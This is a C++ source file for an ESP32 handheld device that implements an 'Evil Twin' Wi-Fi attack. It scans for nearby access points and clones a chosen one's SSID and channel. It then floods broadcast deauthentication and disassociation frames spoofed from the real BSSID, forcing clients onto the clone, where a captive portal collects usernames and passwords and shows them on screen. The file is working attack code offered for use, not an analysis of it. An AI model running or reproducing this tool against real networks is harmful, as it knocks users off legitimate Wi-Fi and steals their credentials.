/*
 * wifi_eviltwin.cpp - Evil Twin sub-application.
 *
 * Flow:
 *   ET_SCAN    - async AP scan (spinner)
 *   ET_SELECT  - scrollable AP list; user picks target to clone
 *   ET_PASSWD  - if target is WPA2/WPA/WEP: enter PSK (8-63 chars)
 *                  SELECT = launch with WPA2  |  BACK = launch open (no PSK)
 *   ET_RUNNING - clone AP + deauth loop + captive portal
 *
 * Clone mirrors the target's SSID and channel exactly.
 * Auth mode: WPA2 if a valid password was entered, open otherwise.
 *
 * Deauth loop (RUNNING):
 *   Sends broadcast deauth + disassoc frames spoofed from the real BSSID
 *   every tick, forcing associated clients to re-probe.  Because our clone
 *   is on the same channel with the same SSID (and optionally the same PSK),
 *   devices typically roam to us.
 *
 * WPA2 success condition:
 *   The entered PSK must match the real AP.  Devices auto-connect only if
 *   the handshake succeeds.  Wrong PSK → devices loop; use open clone +
 *   manual-connect workflow instead.
 */
#ifdef BS_WIFI_ESP32
#ifdef ARDUINO_ARCH_ESP32

#include "wifi_eviltwin.h"

extern "C" {
#include "bs/bs_wifi.h"
#include "bs/bs_gfx.h"
#include "bs/bs_nav.h"
#include "bs/bs_theme.h"
#include "bs/bs_ui.h"
#include "bs/bs_arch.h"
}

#include "esp_wifi.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include "wifi_common.h"
#include "wifi_portal.h"

/* ── Config ─────────────────────────────────────────────────────────────── */

#define ET_MAX_APS        32
#define ET_LOG_LINES       5
#define ET_LOG_LEN        48
#define ET_REFRESH_MS    1000
#define ET_DEAUTH_BURST    3   /* frames per tick per direction              */

static const char k_pw_charset[] =
    " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!@#$%";
#define ET_PW_CHARSET_LEN ((int)(sizeof(k_pw_charset) - 1))
#define ET_MAX_PASS_LEN   63   /* WPA2 PSK: 8-63 printable ASCII */

static char pw_next(char c) {
    for (int i = 0; i < ET_PW_CHARSET_LEN; i++)
        if (k_pw_charset[i] == c) return k_pw_charset[(i + 1) % ET_PW_CHARSET_LEN];
    return k_pw_charset[0];
}
static char pw_prev(char c) {
    for (int i = 0; i < ET_PW_CHARSET_LEN; i++)
        if (k_pw_charset[i] == c)
            return k_pw_charset[(i + ET_PW_CHARSET_LEN - 1) % ET_PW_CHARSET_LEN];
    return k_pw_charset[0];
}

/* ── Phase ───────────────────────────────────────────────────────────────── */

typedef enum { ET_SCAN, ET_SELECT, ET_PASSWD, ET_RUNNING } et_phase_t;

/* ── State ───────────────────────────────────────────────────────────────── */

static et_phase_t   s_phase;
static int          s_cursor;
static int          s_scroll;
static bool         s_dirty;

static bs_wifi_ap_t s_aps[ET_MAX_APS];
static int          s_ap_count;

static bs_wifi_ap_t s_target;          /* clone of the selected AP entry      */

static char         s_passwd[ET_MAX_PASS_LEN + 1];
static int          s_passwd_pos;

static wifi_prng_t  s_prng;
static uint16_t     s_seq;
static uint8_t      s_frame[AUTH_FRAME_LEN];
static uint32_t     s_deauth_total;
static const uint8_t k_bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

static int          s_prev_clients;

static char         s_log[ET_LOG_LINES][ET_LOG_LEN];
static int          s_log_head;
static int          s_log_count;

/* ── Log ─────────────────────────────────────────────────────────────────── */

static void et_log(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(s_log[s_log_head], ET_LOG_LEN, fmt, ap);
    va_end(ap);
    s_log[s_log_head][ET_LOG_LEN - 1] = '\0';
    s_log_head = (s_log_head + 1) % ET_LOG_LINES;
    if (s_log_count < ET_LOG_LINES) s_log_count++;
}

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static inline void apply_seq(uint8_t* frame) {
    frame[22] = (uint8_t)((s_seq & 0x0F) << 4);
    frame[23] = (uint8_t)(s_seq >> 4);
    s_seq++;
}

/* Trim trailing spaces from password buffer; return pointer to static buf */
static const char* trimmed_passwd(void) {
    static char buf[ET_MAX_PASS_LEN + 1];
    strncpy(buf, s_passwd, ET_MAX_PASS_LEN);
    buf[ET_MAX_PASS_LEN] = '\0';
    int n = (int)strlen(buf);
    while (n > 0 && buf[n - 1] == ' ') n--;
    buf[n] = '\0';
    return buf;
}

static int visible_rows(int ts) {
    int lh = bs_gfx_text_h(ts) + 3;
    return bs_ui_content_h() / lh;
}

/* ── Deauth tick (called from RUNNING loop) ──────────────────────────────── */

/* Broadcast deauth + disassoc spoofed from the real BSSID; clients re-probe
 * and associate to our clone (same SSID, same channel) instead.            */
static void deauth_tick(void) {
    for (int b = 0; b < ET_DEAUTH_BURST; b++) {
        wifi_build_deauth(s_frame, k_bcast, s_target.bssid, s_target.bssid, 7);
        apply_seq(s_frame);
        if (bs_wifi_send_raw(BS_WIFI_IF_STA, s_frame, DEAUTH_FRAME_LEN) == 0)
            s_deauth_total++;

        wifi_build_disassoc(s_frame, k_bcast, s_target.bssid, s_target.bssid, 7);
        apply_seq(s_frame);
        if (bs_wifi_send_raw(BS_WIFI_IF_STA, s_frame, DEAUTH_FRAME_LEN) == 0)
            s_deauth_total++;
    }
}

/* ── Draw ────────────────────────────────────────────────────────────────── */

static void draw_scan(void) {
    static uint8_t spin;
    const char* spinners = "-\\|/";
    int ts = bs_ui_text_scale();
    int cy = bs_ui_content_y();
    char buf[32];
    snprintf(buf, sizeof(buf), "Scanning...  %c", spinners[spin++ & 3]);

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Evil Twin");
    bs_gfx_text(8, cy, buf, g_bs_theme.primary, ts);
    bs_ui_draw_hint("BACK=cancel");
    bs_gfx_present();
}

static void draw_select(void) {
    float ts  = bs_ui_text_scale();
    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 3;
    int vis = visible_rows(ts);

    bs_gfx_clear(g_bs_theme.bg);

    char title[32];
    snprintf(title, sizeof(title), "Evil Twin  [%d APs]", s_ap_count);
    bs_ui_draw_header(title);

    if (s_ap_count == 0) {
        bs_gfx_text(8, cy, "No APs found", g_bs_theme.dim, ts);
    } else {
        for (int i = 0; i < vis; i++) {
            int idx = s_scroll + i;
            if (idx >= s_ap_count) break;
            bool hl = (idx == s_cursor);
            int  y  = cy + i * lh;
            if (hl) bs_gfx_fill_rect(0, y - 1, sw, lh - 1, g_bs_theme.dim);

            char buf[52];
            snprintf(buf, sizeof(buf), "%-18.18s ch%-2d %-5s %4d",
                     s_aps[idx].ssid[0] ? s_aps[idx].ssid : "<hidden>",
                     s_aps[idx].channel,
                     bs_wifi_auth_str(s_aps[idx].auth),
                     s_aps[idx].rssi);
            bs_color_t col = hl ? g_bs_theme.accent : g_bs_theme.primary;
            bs_ui_draw_text_box(4, y, sw - 8, buf, col, ts, hl);
        }
    }

    bs_ui_draw_hint("SELECT=clone  UP/DN=scroll  BACK=exit");
    bs_gfx_present();
}

static void draw_passwd(void) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int sw  = bs_gfx_width();
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;
    int cw  = bs_gfx_text_w("A", ts);

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Evil Twin / WPA2 Key");

    char buf[80];
    snprintf(buf, sizeof(buf), "Target: %.38s",
             s_target.ssid[0] ? s_target.ssid : "<hidden>");
    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
    y += lh2 + 2;

    snprintf(buf, sizeof(buf), "Auth: %s  ch%d",
             bs_wifi_auth_str(s_target.auth), s_target.channel);
    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
    y += lh2 + 4;

    bs_gfx_text(8, y, "Password:", g_bs_theme.dim, ts2);
    y += lh2 + 2;

    /* Character editor row */
    int chars_per_row = (sw - 16) / (cw + 2);
    if (chars_per_row < 1) chars_per_row = 1;

    int view_start = s_passwd_pos - chars_per_row / 2;
    if (view_start < 0) view_start = 0;
    if (view_start > ET_MAX_PASS_LEN - chars_per_row)
        view_start = ET_MAX_PASS_LEN - chars_per_row;
    if (view_start < 0) view_start = 0;

    for (int i = 0; i < chars_per_row && (view_start + i) < ET_MAX_PASS_LEN; i++) {
        int pos = view_start + i;
        int x   = 8 + i * (cw + 2);
        bool is_cursor = (pos == s_passwd_pos);
        char ch = s_passwd[pos];
        char cbuf[2] = { ch == ' ' ? '_' : ch, '\0' };

        if (is_cursor) {
            bs_gfx_fill_rect(x - 1, y - 1, cw + 2, bs_gfx_text_h(ts) + 2,
                             g_bs_theme.accent);
            bs_gfx_text(x, y, cbuf, g_bs_theme.bg, ts);
        } else {
            bs_color_t c = (ch != ' ') ? g_bs_theme.primary : g_bs_theme.dim;
            bs_gfx_text(x, y, cbuf, c, ts);
        }
    }
    y += lh + 4;

    if (y + lh2 < bs_gfx_height() - bs_gfx_text_h(ts2) - 6) {
        int pw_len = 0;
        const char* tp = trimmed_passwd();
        pw_len = (int)strlen(tp);
        snprintf(buf, sizeof(buf), "len:%d  pos:%d  '%c'",
                 pw_len, s_passwd_pos + 1, s_passwd[s_passwd_pos]);
        bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
    }

    bs_ui_draw_hint("UP/DN=char  L/R=move  SEL=WPA2  BACK=open");
    bs_gfx_present();
}

static void draw_running(void) {
    float ts  = bs_ui_text_scale();
    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
    int sw  = bs_gfx_width();
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Evil Twin [RUNNING]");

    char buf[80];
    snprintf(buf, sizeof(buf), "%.30s  ch%d",
             s_target.ssid[0] ? s_target.ssid : "<hidden>",
             s_target.channel);
    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts, false);
    y += lh;

    wifi_sta_list_t sta = {};
    esp_wifi_ap_get_sta_list(&sta);
    snprintf(buf, sizeof(buf), "Clients:%d  Deauth:%lu",
             sta.num, (unsigned long)s_deauth_total);
    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.primary, ts2, false);
    y += lh2 + 2;

    int n_creds = wifi_portal_cred_count();
    if (n_creds > 0) {
        const wifi_portal_cred_t* last = wifi_portal_get_cred(n_creds - 1);
        snprintf(buf, sizeof(buf), "Creds:%d  %.16s/%.16s",
                 n_creds, last ? last->user : "", last ? last->pass : "");
        bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts2, false);
        y += lh2;
    }

    bs_gfx_fill_rect(4, y, sw - 8, 1, g_bs_theme.dim);
    y += 4;

    int hint_h = bs_gfx_text_h(ts2) + 6;
    int max_y  = bs_gfx_height() - hint_h;

    for (int i = 0; i < s_log_count; i++) {
        int idx = (s_log_head - s_log_count + i + ET_LOG_LINES * 2) % ET_LOG_LINES;
        bs_color_t c = (i == s_log_count - 1) ? g_bs_theme.primary : g_bs_theme.dim;
        int ly = y + i * lh2;
        if (ly + lh2 > max_y) break;
        bs_ui_draw_text_box(8, ly, sw - 16, s_log[idx], c, ts2, false);
    }

    bs_ui_draw_hint("BACK=stop");
    bs_gfx_present();
}

/* ── Main entry ──────────────────────────────────────────────────────────── */

extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
    s_phase         = ET_SCAN;
    s_cursor        = 0;
    s_scroll        = 0;
    s_dirty         = true;
    s_ap_count      = 0;
    s_deauth_total  = 0;
    s_prev_clients  = 0;
    s_log_head      = 0;
    s_log_count     = 0;

    wifi_prng_seed(&s_prng, (uint32_t)arch->millis() ^ 0xEBB355u);
    s_seq = (uint16_t)(arch->millis() & 0xFFF);

    bs_wifi_scan_start();

    uint32_t last_scan_draw  = 0;
    uint32_t last_refresh    = 0;

    uint32_t prev_ms = arch->millis();
    for (;;) {
        uint32_t now = arch->millis();
        bs_ui_advance_ms(now - prev_ms);
        prev_ms = now;

        /* ── Portal service (RUNNING) ───────────────────────────────────── */
        if (s_phase == ET_RUNNING) {
            if (wifi_portal_active()) {
                wifi_portal_poll();

                wifi_sta_list_t sta = {};
                esp_wifi_ap_get_sta_list(&sta);
                if (sta.num > s_prev_clients) {
                    for (int i = s_prev_clients; i < (int)sta.num; i++) {
                        et_log("Client %02X:%02X:%02X:.. joined",
                               sta.sta[i].mac[0],
                               sta.sta[i].mac[1],
                               sta.sta[i].mac[2]);
                    }
                    s_dirty = true;
                } else if (sta.num < s_prev_clients) {
                    et_log("Client disconnected");
                    s_dirty = true;
                }
                s_prev_clients = sta.num;
            }

            deauth_tick();
        }

        /* ── Tick: scan ─────────────────────────────────────────────────── */
        if (s_phase == ET_SCAN) {
            if (bs_wifi_scan_done()) {
                bs_wifi_ap_t tmp[ET_MAX_APS];
                s_ap_count = bs_wifi_scan_results(tmp, ET_MAX_APS);
                if (s_ap_count < 0) s_ap_count = 0;
                for (int i = 0; i < s_ap_count; i++) s_aps[i] = tmp[i];
                s_cursor = 0;
                s_scroll = 0;
                s_phase  = ET_SELECT;
                s_dirty  = true;
            } else if ((now - last_scan_draw) >= 100) {
                last_scan_draw = now;
                s_dirty = true;
            }
        }

        /* ── Input ──────────────────────────────────────────────────────── */
        bs_nav_id_t nav;
        while ((nav = bs_nav_poll()) != BS_NAV_NONE) {
            switch (s_phase) {

            case ET_SCAN:
                if (nav == BS_NAV_BACK) return;
                break;

            case ET_SELECT: {
                int vis = visible_rows(bs_ui_text_scale());
                if (nav == BS_NAV_UP || nav == BS_NAV_PREV) {
                    if (s_cursor > 0) {
                        s_cursor--;
                        if (s_cursor < s_scroll) s_scroll = s_cursor;
                        s_dirty = true;
                    }
                } else if (nav == BS_NAV_DOWN || nav == BS_NAV_NEXT) {
                    if (s_cursor < s_ap_count - 1) {
                        s_cursor++;
                        if (s_cursor >= s_scroll + vis) s_scroll = s_cursor - vis + 1;
                        s_dirty = true;
                    }
                } else if (nav == BS_NAV_SELECT && s_ap_count > 0) {
                    s_target = s_aps[s_cursor];
                    /* If protected: ask for PSK first */
                    if (s_target.auth != BS_WIFI_AUTH_OPEN) {
                        memset(s_passwd, ' ', ET_MAX_PASS_LEN);
                        s_passwd[ET_MAX_PASS_LEN] = '\0';
                        s_passwd_pos = 0;
                        s_phase = ET_PASSWD;
                    } else {
                        /* Open: launch immediately */
                        if (wifi_portal_start(s_target.ssid, s_target.channel, nullptr)) {
                            et_log("Clone open ch%d  %.20s",
                                   s_target.channel, s_target.ssid);
                            s_deauth_total = 0;
                            s_prev_clients = 0;
                            s_phase        = ET_RUNNING;
                            last_refresh   = now;
                        } else {
                            et_log("AP start FAILED");
                        }
                    }
                    s_dirty = true;
                } else if (nav == BS_NAV_BACK) {
                    return;
                }
                break;
            }

            case ET_PASSWD: {
                if (nav == BS_NAV_UP || nav == BS_NAV_PREV) {
                    s_passwd[s_passwd_pos] = pw_prev(s_passwd[s_passwd_pos]);
                    s_dirty = true;
                } else if (nav == BS_NAV_DOWN || nav == BS_NAV_NEXT) {
                    s_passwd[s_passwd_pos] = pw_next(s_passwd[s_passwd_pos]);
                    s_dirty = true;
                } else if (nav == BS_NAV_LEFT) {
                    if (s_passwd_pos > 0) { s_passwd_pos--; s_dirty = true; }
                } else if (nav == BS_NAV_RIGHT) {
                    if (s_passwd_pos < ET_MAX_PASS_LEN - 1) { s_passwd_pos++; s_dirty = true; }
                } else if (nav == BS_NAV_SELECT || nav == BS_NAV_BACK) {
                    const char* pw   = (nav == BS_NAV_SELECT) ? trimmed_passwd() : nullptr;
                    bool use_wpa2    = (pw && strlen(pw) >= 8);
                    if (wifi_portal_start(s_target.ssid, s_target.channel,
                                          use_wpa2 ? pw : nullptr)) {
                        if (use_wpa2)
                            et_log("Clone WPA2 ch%d  %.18s",
                                   s_target.channel, s_target.ssid);
                        else
                            et_log("Clone open ch%d  %.18s",
                                   s_target.channel, s_target.ssid);
                        s_deauth_total = 0;
                        s_prev_clients = 0;
                        s_phase        = ET_RUNNING;
                        last_refresh   = now;
                    } else {
                        et_log("AP start FAILED");
                        s_phase = ET_SELECT;
                    }
                    s_dirty = true;
                }
                break;
            }

            case ET_RUNNING:
                if (nav == BS_NAV_BACK) {
                    et_log("Stopped. Deauth: %lu", (unsigned long)s_deauth_total);
                    wifi_portal_stop();
                    return;
                }
                break;
            }
        }

        /* ── Draw ───────────────────────────────────────────────────────── */
        if (s_dirty) {
            s_dirty = false;
            switch (s_phase) {
            case ET_SCAN:    draw_scan();    break;
            case ET_SELECT:  draw_select();  break;
            case ET_PASSWD:  draw_passwd();  break;
            case ET_RUNNING: draw_running(); break;
            }
        }

        if (s_phase == ET_RUNNING && (now - last_refresh) >= (uint32_t)ET_REFRESH_MS) {
            last_refresh = now;
            draw_running();
        }

        arch->delay_ms(s_phase == ET_RUNNING ? 5 : 10);
    }
}

#endif /* ARDUINO_ARCH_ESP32 */
#endif /* BS_WIFI_ESP32 */
